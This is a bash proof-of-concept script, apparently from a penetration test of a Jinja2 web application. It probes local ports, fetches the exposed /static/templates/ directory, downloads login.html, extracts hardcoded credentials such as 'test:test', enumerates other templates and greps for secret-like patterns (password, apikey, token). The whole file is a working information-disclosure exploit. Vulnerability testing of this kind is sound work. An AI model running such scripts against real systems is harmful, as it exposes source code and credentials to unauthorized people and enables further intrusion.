#!/bin/bash

# POC: Jinja2 Template Source Code Exposure via Static Directory Access
# This script demonstrates:
# 1. Directory listing at /static/templates/
# 2. Individual template file access
# 3. Extraction of hardcoded credentials
# 4. Exposure of application structure and developer comments

TARGET="${1:-http://localhost}"

echo "[*] POC: Jinja2 Template Source Code Exposure"
echo "[*] Target: $TARGET"
echo "[*] Testing various ports..."
echo ""

# Try to detect the running service
for port in 5000 8000 8080 3000 80; do
    TEST_URL="http://localhost:$port/static/templates/"
    CODE=$(curl -s -m 2 -o /dev/null -w "%{http_code}" "$TEST_URL" 2>/dev/null)
    if [ "$CODE" != "000" ] && [ "$CODE" != "000" ]; then
        echo "[+] Found service on port $port (HTTP $CODE)"
        TARGET="http://localhost:$port"
        break
    fi
done

echo "[*] Using target: $TARGET"
echo ""

# Test 1: Check directory listing
echo "[+] Test 1: Attempting to access /static/templates/ directory listing"
RESPONSE=$(curl -s -m 5 "$TARGET/static/templates/" 2>/dev/null)
RESPONSE_CODE=$(curl -s -m 5 -o /dev/null -w "%{http_code}" "$TARGET/static/templates/" 2>/dev/null)

echo "[*] Response code: $RESPONSE_CODE"
if [ "$RESPONSE_CODE" = "200" ]; then
    echo "[✓] Directory listing accessible (HTTP $RESPONSE_CODE)"
    echo "[+] Directory contents preview:"
    echo "$RESPONSE" | head -20 | sed 's/^/    /'
else
    echo "[*] Directory listing returned HTTP $RESPONSE_CODE"
fi
echo ""

# Test 2: Access login.html template
echo "[+] Test 2: Accessing /static/templates/login.html"
LOGIN_RESPONSE=$(curl -s -m 5 "$TARGET/static/templates/login.html" 2>/dev/null)
LOGIN_CODE=$(curl -s -m 5 -o /dev/null -w "%{http_code}" "$TARGET/static/templates/login.html" 2>/dev/null)

echo "[*] Response code: $LOGIN_CODE"
if [ "$LOGIN_CODE" = "200" ]; then
    echo "[✓] login.html accessible (HTTP $LOGIN_CODE)"
    
    # Check file size to confirm we got content
    SIZE=$(echo "$LOGIN_RESPONSE" | wc -c)
    echo "[*] File size: $SIZE bytes"
    
    if [ "$SIZE" -gt 100 ]; then
        echo "[✓] Template file contains substantial content"
        
        # Look for test credentials
        if echo "$LOGIN_RESPONSE" | grep -q "test:test"; then
            echo "[✓] FOUND: Hardcoded test credentials (test:test)"
            echo "$LOGIN_RESPONSE" | grep "test:test" | sed 's/^/    /'
        fi
        
        # Look for TODO comments
        if echo "$LOGIN_RESPONSE" | grep -q "TODO"; then
            echo "[✓] FOUND: Developer TODO comments exposed"
            echo "$LOGIN_RESPONSE" | grep "TODO" | sed 's/^/    /'
        fi
        
        # Look for any HTML comments
        COMMENT_COUNT=$(echo "$LOGIN_RESPONSE" | grep -o "<!--" | wc -l)
        if [ "$COMMENT_COUNT" -gt 0 ]; then
            echo "[✓] Found $COMMENT_COUNT HTML comments in template"
        fi
        
        # Show template structure sample
        echo "[+] Template source preview (first 300 chars):"
        echo "$LOGIN_RESPONSE" | head -c 300 | sed 's/^/    /'
        echo "..."
    fi
elif [ "$LOGIN_CODE" != "000" ]; then
    echo "[*] login.html returned HTTP $LOGIN_CODE"
fi
echo ""

# Test 3: Enumerate other template files
echo "[+] Test 3: Enumerating accessible template files"
TEMPLATES=("home.html" "profile.html" "loan_details.html" "error.html" "not_implemented.html")
ACCESSIBLE_COUNT=0

for template in "${TEMPLATES[@]}"; do
    CODE=$(curl -s -m 5 -o /dev/null -w "%{http_code}" "$TARGET/static/templates/$template" 2>/dev/null)
    if [ "$CODE" = "200" ]; then
        echo "[✓] $template - HTTP $CODE (ACCESSIBLE)"
        ((ACCESSIBLE_COUNT++))
    elif [ "$CODE" != "000" ]; then
        echo "[*] $template - HTTP $CODE"
    fi
done

if [ "$ACCESSIBLE_COUNT" -gt 0 ]; then
    echo "[✓] Successfully enumerated $ACCESSIBLE_COUNT template files"
fi
echo ""

# Test 4: Extract sensitive patterns
echo "[+] Test 4: Scanning for sensitive information patterns"
if [ "$LOGIN_CODE" = "200" ] && [ "$SIZE" -gt 100 ]; then
    PATTERNS=("password" "apikey" "secret" "token" "credentials" "TODO" "FIXME" "test" "debug")
    
    for pattern in "${PATTERNS[@]}"; do
        COUNT=$(echo "$LOGIN_RESPONSE" | grep -ci "$pattern" || true)
        if [ "$COUNT" -gt 0 ]; then
            echo "[✓] Pattern '$pattern' found $COUNT time(s) in login.html"
        fi
    done
fi
echo ""

echo "[!] ASSESSMENT:"
if [ "$LOGIN_CODE" = "200" ]; then
    echo "[✓] VULNERABILITY CONFIRMED - Template source code is accessible"
    echo "    - Template files served directly from /static/templates/"
    echo "    - HTML/Jinja2 source code exposed to unauthenticated users"
    echo "    - Sensitive information and comments visible in source"
elif [ "$LOGIN_CODE" != "000" ] && [ "$LOGIN_CODE" != "404" ]; then
    echo "[*] Response received (HTTP $LOGIN_CODE) - vulnerability may be present"
else
    echo "[*] Could not connect to $TARGET"
    echo "[*] Ensure the web application is running and accessible"
fi